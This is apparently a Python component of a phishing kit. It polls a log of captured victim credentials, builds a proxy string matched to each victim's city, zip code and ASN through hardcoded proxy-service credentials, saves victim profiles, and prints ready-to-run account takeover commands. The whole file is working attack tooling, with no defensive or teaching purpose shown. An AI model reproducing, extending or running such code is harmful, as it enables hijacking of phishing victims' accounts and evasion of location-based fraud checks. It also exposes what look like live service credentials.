#!/usr/bin/env python3
# master_watcher.py - v7.0 (Unified Log Parser & Automated Takeover Engine)

import subprocess
import time
import json
import os
import re
import traceback

# --- HARDCODED CREDENTIALS ---
DATAIMPULSE_BASE_USER = "768b27aac68d92f840d9"
DATAIMPULSE_API_KEY = "b7564921f7b4962f"
DATAIMPULSE_GATEWAY = "gw.dataimpulse.com:10000"
PROXY_PROTOCOL = "socks5"
# ----------------------------------------------------------------

# --- Paths ---
HOME_DIR = os.path.expanduser("~")
# MaxPhisher directory (where this script is located)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SITE_DIR = os.path.join(HOME_DIR, ".site") 
SESSIONS_LOG = os.path.join(SITE_DIR, "sessions.json")
IMPERSONATOR_SCRIPT = os.path.join(BASE_DIR, "impersonator2.py")
TEMP_PROFILE_DIR = "/tmp/victim_profiles"

def get_hyper_targeted_proxy_string(location_data):
    """Constructs a hyper-targeted proxy string for DataImpulse in the correct format.
    Aligned with impersonator2.py generate_dataimpulse_proxy() function."""
    
    def clean_param(text):
        """Standardized location cleaning: lowercase alphanumeric only (DataImpulse compatible)"""
        if not text: return ""
        return re.sub(r'[^a-zA-Z0-9]', '', str(text)).lower()
    
    def clean_asn(asn):
        """Extract ASN number, remove 'AS' prefix"""
        if not asn:
            return ''
        asn_str = str(asn)
        # Remove 'AS' prefix (case-insensitive)
        asn_str = re.sub(r'^[Aa][Ss]', '', asn_str)
        # Extract only digits
        asn_digits = re.sub(r'[^0-9]', '', asn_str)
        return asn_digits

    # Extract location from ip-api.com data stored in sessions.json (aligned with impersonator2.py)
    country = clean_param(location_data.get('country', 'PH'))  # 'PH' → 'ph', 'United States' → 'unitedstates'
    region = clean_param(location_data.get('region', 'Metro Manila'))  # 'Metro Manila' → 'metromanila'
    city = clean_param(location_data.get('city', 'Manila'))  # 'Caloocan City' → 'caloocancity'
    zip_code = location_data.get('zip', '1000')  # Keep as-is (no cleaning needed)
    asn = clean_asn(location_data.get('asn', '132199'))  # Remove 'AS' prefix if present
    
    # Build location parameter string (aligned with impersonator2.py format)
    location_params = f"cr.{country};state.{region};city.{city};zip.{zip_code};asn.{asn}"
    
    # Build username with location parameters
    username_with_location = f"{DATAIMPULSE_BASE_USER}__{location_params}"
    
    # Construct complete proxy string with protocol (aligned with impersonator2.py)
    # Format: protocol://username__cr.ph;state.x;city.y;zip.z;asn.n:password@host:port
    proxy_string = f"socks5://{username_with_location}:{DATAIMPULSE_API_KEY}@{DATAIMPULSE_GATEWAY}"
    
    print(f"    - Constructed DataImpulse Proxy: socks5://{DATAIMPULSE_BASE_USER}__{location_params}:****@{DATAIMPULSE_GATEWAY}")
    return proxy_string

def main():
    print(f"[MASTER WATCHER] DataImpulse Hyper-Targeting Engine Online.")
    print(f"[INFO] Monitoring unified log: {SESSIONS_LOG}")
    
    if not os.path.exists(TEMP_PROFILE_DIR):
        os.makedirs(TEMP_PROFILE_DIR)

    # { "session_id": num_credentials_processed }
    processed_creds = {} 

    while True:
        try:
            time.sleep(2)
            if not os.path.exists(SESSIONS_LOG):
                continue

            with open(SESSIONS_LOG, 'r') as f:
                content = f.read()
                if not content.strip():
                    continue
                all_sessions = json.loads(content)

            for session in all_sessions:
                session_id = session.get('sessionId')
                if not session_id:
                    continue

                num_creds_captured = len(session.get('credentials', []))
                num_creds_processed = processed_creds.get(session_id, 0)

                if num_creds_captured > num_creds_processed:
                    # Get the latest credential set
                    latest_cred = session['credentials'][-1]
                    username = latest_cred.get('username')
                    password = latest_cred.get('password')

                    print(f"\n[+] NEW CREDENTIALS DETECTED! Launching takeover for Session: {session_id}")
                    
                    # 1. Get location data (already in the profile)
                    location_data = session.get('location', {})
                    print(f"    - Target Location Data: {location_data}")

                    # 2. Construct the proxy string
                    proxy_string = get_hyper_targeted_proxy_string(location_data)

                    # 3. Save the full profile for the impersonator
                    profile_path = os.path.join(TEMP_PROFILE_DIR, f"{session_id}_profile.json")
                    with open(profile_path, 'w') as pf:
                        json.dump(session, pf, indent=2)
                    print(f"    - Saved full profile to: {profile_path}")

                    # 4. Print ready-to-run command (MANUAL EXECUTION)
                    print("\n" + "="*70)
                    print("    [READY STATE] Profile prepared for manual impersonation")
                    print("="*70)
                    print(f"\n    Target: {username}")
                    print(f"    Location: {location_data.get('city', 'N/A')}, {location_data.get('region', 'N/A')}, {location_data.get('country', 'N/A')}")
                    print(f"\n    --- COPY AND RUN THIS COMMAND ---\n")
                    print(f"    python3 ~/haymayndz/validate_and_run.py \\")
                    print(f"      --session-id \"{session_id}\" \\")
                    print(f"      --username \"{username}\" \\")
                    print(f"      --password \"{password}\"")
                    print(f"\n    --- OR DIRECT EXECUTION (NO VALIDATION) ---\n")
                    print(f"    python3 ~/universal-redteam-rules/core/impersonator2.py \\")
                    print(f"      --profile \"{profile_path}\" \\")
                    print(f"      --username \"{username}\" \\")
                    print(f"      --password \"{password}\" \\")
                    print(f"      --proxy \"{proxy_string}\"")
                    print("\n" + "="*70 + "\n")
                    
                    # 5. Mark this credential set as processed
                    processed_creds[session_id] = num_creds_captured

        except json.JSONDecodeError:
            print("[WARNING] Log file is being written to, skipping this cycle.")
            continue
        except Exception as e:
            print(f"--- [CRITICAL FAILURE] An unexpected error occurred: {e} ---")
            traceback.print_exc()

if __name__ == "__main__":
    main()